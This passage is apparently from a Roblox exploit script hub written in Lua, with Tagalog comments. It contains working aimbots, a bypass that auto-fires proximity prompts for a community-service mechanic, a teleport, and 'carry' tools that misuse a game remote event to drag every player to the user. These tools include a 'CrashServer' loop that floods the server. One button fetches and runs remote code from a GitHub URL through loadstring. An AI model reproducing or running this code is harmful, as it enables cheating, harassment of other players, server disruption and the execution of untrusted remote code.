	_G.Disabled = not _G.Disabled
	ToggleButton.Text = _G.Disabled and "Disabled" or "Enabled"
end)

-- FOV TOGGLE
local FOVToggle = Instance.new("TextButton", Frame)
FOVToggle.Size = UDim2.new(0.8, 0, 0, 25)
FOVToggle.Position = UDim2.new(0.1, 0, 0.83, 0)
FOVToggle.BackgroundColor3 = Color3.new(0,0,0)
FOVToggle.TextColor3 = Color3.new(1,1,1)
FOVToggle.Text = "FOV: Visible"
round(FOVToggle, 10)

local fovHidden = false
FOVToggle.MouseButton1Click:Connect(function()
	fovHidden = not fovHidden
	Circle.Visible = not fovHidden
	FOVToggle.Text = fovHidden and "FOV: Hidden" or "FOV: Visible"
end)

-- Init slider position
updateSize((_G.HeadSize - 1) / 34)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO AFK COMSERV (MONSY)", function()
	-- BYPASS COMSERVE — FULL WHITE THEME + BLACK TEXT ONLY
-- Mas maliit, mas malinis, 100% gumagana pa rin

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- GLOBALS
_G.InstantEnabled = false
_G.TeleportEnabled = false
_G.TriggerEnabled = false
_G.AnimationEnabled = false
_G.CameraEnabled = false

-- CAMERA SHAKE
local Camera = workspace.CurrentCamera
local cameraConnection

local function setupCamera()
    if cameraConnection then cameraConnection:Disconnect() end
    cameraConnection = RunService.RenderStepped:Connect(function()
        if not _G.CameraEnabled then return end
        local flip = math.sign(math.sin(tick() * 25)) * 0.15
        Camera.CFrame = Camera.CFrame * CFrame.new(flip, 0, 0)
    end)
end

-- INSTANT E
local instantConns = {}
local function setupInstant()
    for _, v in workspace:GetDescendants() do
        if v:IsA("ProximityPrompt") then v.HoldDuration = 0 end
    end
    instantConns.added = workspace.DescendantAdded:Connect(function(v)
        if v:IsA("ProximityPrompt") then v.HoldDuration = 0 end
    end)
    instantConns.input = UserInputService.InputBegan:Connect(function(i,gp)
        if gp or i.KeyCode ~= Enum.KeyCode.E then return end
        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        for _, p in workspace:GetDescendants() do
            if p:IsA("ProximityPrompt") and p.Enabled then
                if (p.Parent.Position - hrp.Position).Magnitude <= p.MaxActivationDistance then
                    fireproximityprompt(p)
                end
            end
        end
    end)
end

-- TRIGGER
local triggerConn, reconnectTask
local function setupTrigger()
    local indexes = {1024,1023,1013,1014,1018,1017,1028,1025,1026,1031,1027,1016}
    local cleaningSpot = workspace:FindFirstChild("CleaningSpot")

    local function getPrompts()
        local t = {}
        for _, i in indexes do
            local part = workspace:FindFirstChild(tostring(i))
            if part then
                local p = part:FindFirstChild("ProximityPrompt")
                if p then table.insert(t, p) end
            end
        end
        if cleaningSpot and cleaningSpot:FindFirstChild("ProximityPrompt") then
            table.insert(t, cleaningSpot.ProximityPrompt)
        end
        return t
    end

    triggerConn = RunService.Heartbeat:Connect(function()
        if not _G.TriggerEnabled then return end
        for _, p in getPrompts() do fireproximityprompt(p, 0) end
    end)
end

-- ANIMATION BYPASS
local animConns = {}
local function setupAnimation()
    local function onChar(char)
        local hum = char:WaitForChild("Humanoid")
        local animate = char:WaitForChild("Animate")
        for _, sec in {"idle","fall","climb","toolnone","sit","freefall"} do
            local s = animate:FindFirstChild(sec)
            if s then for _, a in s:GetChildren() do if a:IsA("StringValue") then a.AnimationId = "" end end end
        end
        local conn = RunService.Heartbeat:Connect(function()
            if not _G.AnimationEnabled then return end
            for _, track in hum:GetPlayingAnimationTracks() do
                local id = track.Animation.AnimationId:lower()
                if not (id:find("walk") or id:find("run") or id:find("swim")) and track.Priority ~= Enum.AnimationPriority.Movement then
                    track:Stop(0)
                end
            end
        end)
        animConns[char] = conn
    end
    if player.Character then onChar(player.Character) end
    animConns.added = player.CharacterAdded:Connect(onChar)
end

-- GUI — PURE WHITE + BLACK TEXT
local gui = Instance.new("ScreenGui")
gui.Name = "BypassGUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 260, 0, 290)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.new(1,1,1)     -- PURE WHITE
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 18)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,50)
title.BackgroundTransparency = 1
title.Text = "BYPASS COMSERVE"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBlack
title.TextSize = 22
title.Parent = frame

-- Toggle Creator (White + Black Text)
local function createToggle(name, y, var, on, off)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0,140,0,36)
    lbl.Position = UDim2.new(0,20,0,y)
    lbl.BackgroundTransparency = 1
    lbl.Text = name
    lbl.TextColor3 = Color3.new(0,0,0)
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 16
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = frame

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0,62,0,32)
    bg.Position = UDim2.new(1,-82,0,y+2)
    bg.BackgroundColor3 = Color3.fromRGB(230,230,230)
    bg.Parent = frame
    Instance.new("UICorner", bg).CornerRadius = UDim.new(0,16)

    local knob = Instance.new("Frame")
    knob.Size = UDim2.new(0,28,0,28)
    knob.Position = UDim2.new(0,4,0.5,-14)
    knob.BackgroundColor3 = Color3.new(1,1,1)
    knob.Parent = bg
    Instance.new("UICorner", knob).CornerRadius = UDim.new(0,14)

    bg.InputBegan:Connect(function(i)
        if i.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
        _G[var] = not _G[var]
        if _G[var] then
            knob.Position = UDim2.new(1,-32,0.5,-14)
            bg.BackgroundColor3 = Color3.fromRGB(100,200,100)
            if on then on() end
        else
            knob.Position = UDim2.new(0,4,0.5,-14)
            bg.BackgroundColor3 = Color3.fromRGB(230,230,230)
            if off then off() end
        end
    end)
end

-- Create All Toggles
createToggle("INSTANT INTERACT", 60, "InstantEnabled", setupInstant, function()
    for _,c in instantConns do if c.Connected then c:Disconnect() end end
    instantConns = {}
end)

createToggle("TELEPORT", 100, "TeleportEnabled", function()
    local pos = CFrame.new(503.67, 4.95, -765.29)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = pos
    end
end)

createToggle("AUTO TRIGGER", 140, "TriggerEnabled", setupTrigger, function()
    if triggerConn then triggerConn:Disconnect() end
end)

createToggle("NO ANIMATION", 180, "AnimationEnabled", setupAnimation, function()
    for _,c in animConns do if c.Connected then c:Disconnect() end end
    animConns = {}
end)

createToggle("CAMERA SHAKE", 220, "CameraEnabled", setupCamera, function()
    if cameraConnection then cameraConnection:Disconnect() end
end)

-- Close Button
local close = Instance.new("TextButton")
close.Size = UDim2.new(0,36,0,36)
close.Position = UDim2.new(1,-46,0,8)
close.BackgroundColor3 = Color3.new(1,1,1)
close.Text = "X"
close.TextColor3 = Color3.new(0,0,0)
close.Font = Enum.Font.GothamBlack
close.TextSize = 20
close.Parent = frame
Instance.new("UICorner", close).CornerRadius = UDim.new(0,12)

close.MouseButton1Click:Connect(function()
    _G.InstantEnabled = false _G.TeleportEnabled = false
    _G.TriggerEnabled = false _G.AnimationEnabled = false _G.CameraEnabled = false
    gui:Destroy()
end)
end)


local function addMainMenuButton(text, callback)
	local panel = allTabPanels["BRING MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("CARRY SYSTEM BRING ALL 1 (MONSY)", function()
	local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Setup UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "BringPartGUI"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Name = "Frame"
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "PUBLIC ENEMY CMD"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(0,0,0) -- White na
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Name = "CommandBox"
textBox.Text = ""
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.GothamBold
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.TextSize = 24
textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White when OFF
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = frame

-- Carry variables
local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices"):WaitForChild("Couple Hug")

-- Command functions
local commands = {}

commands["BringAll"] = function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			carryRemote:FireServer({
				cmd = "Carry",
				carrychoicesss = carryChoice,
				firstPlr = plr
			})
		end
	end
	wait(0.03)
	carryRemote:FireServer({ cmd = "Declinecarry" })
end

commands["BringRandom"] = function()
	local others = {}
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			table.insert(others, plr)
		end
	end
	if #others > 0 then
		local rand = others[math.random(1, #others)]
		carryRemote:FireServer({
			cmd = "Carry",
			carrychoicesss = carryChoice,
			firstPlr = rand
		})
		wait(0.03)
		carryRemote:FireServer({ cmd = "Declinecarry" })
	end
end

commands["CrashServer"] = function()
	while true do
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player then
				carryRemote:FireServer({
					cmd = "Carry",
					carrychoicesss = carryChoice,
					firstPlr = plr
				})
			end
		end
		carryRemote:FireServer({ cmd = "Declinecarry" })
		task.wait()
	end
end

commands["Secret"] = function()
	local chatService = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	chatService:FireServer("MONSY BALABAGKUMANTOT", "All")
end

-- Toggle logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- Green ON
		local cmdText = textBox.Text
		local commandFunc = commands[cmdText]
		if commandFunc then
			commandFunc()
		else
			warn("Unknown command: " .. cmdText)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White OFF
	end
end)
end)

addMainMenuButton("CARRY SYSTEM BRING ALL 2 (MONSY)", function()
	local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Setup UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "BringPartGUI"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Name = "Frame"
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "PUBLIC ENEMY CMD"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(0,0,0) -- Changed from red to white
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Name = "CommandBox"
textBox.Text = ""
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.GothamBold
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.TextSize = 24
textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- Changed from red to white
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = frame

-- Carry variables
local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices"):WaitForChild("Pabuhat")

-- Command functions
local commands = {}

commands["BringAll"] = function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			carryRemote:FireServer({
				cmd = "Carry",
				carrychoicesss = carryChoice,
				firstPlr = plr
			})
		end
	end
	wait(0.07)
	carryRemote:FireServer({ cmd = "Declinecarry" })
end

commands["BringRandom"] = function()
	local others = {}
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			table.insert(others, plr)
		end
	end
	if #others > 0 then
		local rand = others[math.random(1, #others)]
		carryRemote:FireServer({
			cmd = "Carry",
			carrychoicesss = carryChoice,
			firstPlr = rand
		})
		wait(0.07)
		carryRemote:FireServer({ cmd = "Declinecarry" })
	end
end

commands["CrashServer"] = function()
	while true do
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player then
				carryRemote:FireServer({
					cmd = "Carry",
					carrychoicesss = carryChoice,
					firstPlr = plr
				})
			end
		end
		carryRemote:FireServer({ cmd = "Declinecarry" })
		task.wait()
	end
end

commands["Secret"] = function()
	local chatService = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	chatService:FireServer("MONSY BALABAGKUMANTOT", "All")
end

-- Toggle logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
		local cmdText = textBox.Text
		local commandFunc = commands[cmdText]
		if commandFunc then
			commandFunc()
		else
			warn("Unknown command: " .. cmdText)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- Changed OFF color to white
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CARRY SYSTEM BRING ALL (VERSION 3)", function()
	local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Setup UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "BringPartGUI"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Name = "Frame"
frame.Size = UDim2.new(0, 300, 0, 270)
frame.Position = UDim2.new(0.5, -150, 0.5, -135)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "BRING ALL SYSTEM"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

-- Helper to create black button with white text
local function createButton(name, text, yPos)
	local button = Instance.new("TextButton")
	button.Name = name
	button.Text = text
	button.Font = Enum.Font.GothamBold
	button.TextColor3 = Color3.fromRGB(0,0,0)
	button.TextSize = 14
	button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	button.BorderSizePixel = 0
	button.Size = UDim2.new(0.9, 0, 0, 35)
	button.Position = UDim2.new(0.05, 0, 0, yPos)
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
	button.Parent = frame
	return button
end

-- Create Buttons
local bringAllButton = createButton("BringAllButton", "BringAll", 35)
local bringRandomButton = createButton("BringRandomButton", "BringRandom", 80)
local crashServerButton = createButton("CrashServerButton", "CrashServer", 125)

-- Username TextBox
local textBox = Instance.new("TextBox")
textBox.Name = "CommandBox"
textBox.Text = ""
textBox.PlaceholderText = "Enter Username"
textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
textBox.Font = Enum.Font.GothamBold
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.TextSize = 14
textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 35)
textBox.Position = UDim2.new(0.05, 0, 0, 170)
textBox.ClearTextOnFocus = false
textBox.Parent = frame
Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 6)

-- Execute Button
local executeButton = createButton("ExecuteButton", "EXECUTE", 215)

-- Carry variables
local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices")["Couple Hug"]

-- Command functions
local commands = {}

commands["BringAll"] = function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			carryRemote:FireServer({
				cmd = "Carry",
				carrychoicesss = carryChoice,
				firstPlr = plr
			})
		end
	end
	wait(0.02)
	carryRemote:FireServer({ cmd = "Declinecarry" })
end

commands["BringRandom"] = function()
	local others = {}
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			table.insert(others, plr)
		end
	end
	if #others > 0 then
		local rand = others[math.random(1, #others)]
		carryRemote:FireServer({
			cmd = "Carry",
			carrychoicesss = carryChoice,
			firstPlr = rand
		})
		wait(0.02)
		carryRemote:FireServer({ cmd = "Declinecarry" })
	end
end

commands["CrashServer"] = function()
	while true do
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player then
				carryRemote:FireServer({
					cmd = "Carry",
					carrychoicesss = carryChoice,
					firstPlr = plr
				})
			end
		end
		carryRemote:FireServer({ cmd = "Declinecarry" })
		task.wait(5)
	end
end

-- Button connections
bringAllButton.MouseButton1Click:Connect(commands["BringAll"])
bringRandomButton.MouseButton1Click:Connect(commands["BringRandom"])
crashServerButton.MouseButton1Click:Connect(commands["CrashServer"])

-- Execute button logic (EXACT NAME, uses "Dragging Carry ")
executeButton.MouseButton1Click:Connect(function()
	local inputText = textBox.Text:match("^%s*(.-)%s*$") -- trim
	if inputText == "" then
		warn("Please enter a username.")
		return
	end

	local target = Players:FindFirstChild(inputText)
	if target and target ~= player then
		carryRemote:FireServer({
			cmd = "Carry",
			firstPlr = target,
			carrychoicesss = ReplicatedStorage.CarryReplic.CarryChoices["Couple Hug"]
		})
	else
		warn("Player '" .. inputText .. "' not found in server.")
	end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["AIMBOT MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("ALADIA AIMBOT VERSION 2 (MONSY)", function()
	local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Camera = workspace.CurrentCamera
 
local AimEnabled = false  -- Toggle aim on/off
local Smoothness = 1   -- Lower value for ultra-smooth tracking (closer to 0 is slower, more precise)
local AimbotMode = "Instant" -- Options: "Instant", "Smooth"
local FOV = 7  -- Field of View in degrees (adjust to your preference)
 
-- Function to get head, neck, or humanoid root part for aiming
local function getTargetPart(character)
    local head = character:FindFirstChild("Head")
    local neck = character:FindFirstChild("Neck")
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
 
    local upperTorso = character:FindFirstChild("UpperTorso")
    local neckAttachment = upperTorso and upperTorso:FindFirstChild("NeckAttachment")
 
    if head then
        return head.Position
    elseif neck then
        return neck.CFrame.Position
    elseif neckAttachment then
        return neckAttachment.WorldPosition
    elseif humanoidRootPart then
        return humanoidRootPart.Position
    end
    return nil
end
 
-- Function to find the closest player's head or neck with distance and FOV check
local function getClosestPlayer()
    local closestTarget = nil
    local shortestDistance = math.huge
 
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local character = player.Character
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                humanoid.Died:Connect(function()
                    player.Character = player.CharacterAdded:Wait()
                end)
                local targetPos = getTargetPart(character)
                if targetPos then
                    -- Calculate distance to the target
                    local distance = (LocalPlayer.Character.HumanoidRootPart.Position - targetPos).Magnitude
 
                    -- Calculate FOV
                    local screenPoint, onScreen = Camera:WorldToScreenPoint(targetPos)
                    if onScreen then
                        local toTarget = (targetPos - Camera.CFrame.Position).unit
                        local cameraForward = Camera.CFrame.LookVector
                        local angle = math.acos(cameraForward:Dot(toTarget)) * (180 / math.pi)
 
                        -- Check if within FOV and the closest distance
                        if angle <= FOV and distance < shortestDistance then
                            shortestDistance = distance
                            closestTarget = targetPos
                        end
                    end
                end
            end
        end
    end
    return closestTarget
end
 
-- Aimbot Function
local function aimAtTarget()
    local target = getClosestPlayer()
    if target then
        if AimbotMode == "Instant" then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, target)
        elseif AimbotMode == "Smooth" then
            Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, target), Smoothness)
        end
    end
end
 
-- Toggle Aimbot on right click hold
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then  -- Right Click to activate
        AimEnabled = true
    end
end)
 
UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then  -- Release Right Click to deactivate
        AimEnabled = false
    end
end)
 
-- Run Aimbot every frame
RunService.RenderStepped:Connect(function()
    if AimEnabled then
        aimAtTarget()
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("FANTASMA AIMBOT (DETECTED)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/usbkillerx/EZhacker/refs/heads/main/EZhack"))()
end)

addMainMenuButton("AIMBOT ON AND OFF (CHESTER)", function()
	--// CONFIG
getgenv().Environment = {
    FOVSettings = {
        Amount = 150,
        Visible = true,
        Color = Color3.fromRGB(255, 255, 255) -- White FOV
    },
    Aimbot = {
        Enabled = true,
        AimPart = "Head"
    }
}

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

--// CREATE FOV CIRCLE
local Circle = Drawing.new("Circle")
Circle.Radius = Environment.FOVSettings.Amount
Circle.Thickness = 2
Circle.Transparency = 1
Circle.Filled = false
Circle.Color = Environment.FOVSettings.Color

--// UPDATE FOV CIRCLE POSITION
RunService.RenderStepped:Connect(function()
    Circle.Position = UIS:GetMouseLocation()
    Circle.Visible = Environment.FOVSettings.Visible
    Circle.Radius = Environment.FOVSettings.Amount
end)

--// AIMBOT FUNCTION
local function GetClosestPlayer()
    local closest, dist = nil, Environment.FOVSettings.Amount
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(Environment.Aimbot.AimPart) then
            local headPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(player.Character[Environment.Aimbot.AimPart].Position)
            if onScreen then
                local mag = (Vector2.new(headPos.X, headPos.Y) - UIS:GetMouseLocation()).Magnitude
                if mag < dist then
                    closest = player
                    dist = mag
                end
            end
        end
    end
    return closest
end

RunService.RenderStepped:Connect(function()
    if Environment.Aimbot.Enabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestPlayer()
        if target then
            workspace.CurrentCamera.CFrame = CFrame.new(
                workspace.CurrentCamera.CFrame.Position,
                target.Character[Environment.Aimbot.AimPart].Position
            )
        end
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local FOVLabel = Instance.new("TextLabel")
local FOVToggleButton = Instance.new("TextButton")  -- FOV visibility toggle button
local AimbotToggleButton = Instance.new("TextButton")  -- Aimbot ON/OFF toggle button

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 180)  -- Adjusted size to accommodate two buttons
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "PERSONAL AIMBOT CHESTER" -- Custom Title
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0.5, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0.5, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = Frame

-- FOV text display
FOVLabel.Size = UDim2.new(1, 0, 0, 20)
FOVLabel.Position = UDim2.new(0, 0, 0.45, 0)
FOVLabel.BackgroundTransparency = 1
FOVLabel.TextColor3 = Color3.fromRGB(0,0,0)
FOVLabel.TextSize = 14
FOVLabel.Font = Enum.Font.SourceSans
FOVLabel.Text = "FOV: " .. Environment.FOVSettings.Amount
FOVLabel.Parent = Frame

-- FOV Visibility Toggle button (top)
FOVToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
FOVToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
FOVToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
FOVToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
FOVToggleButton.TextSize = 14
FOVToggleButton.Font = Enum.Font.SourceSansBold
FOVToggleButton.Text = "FOV: Visible"
FOVToggleButton.Parent = Frame

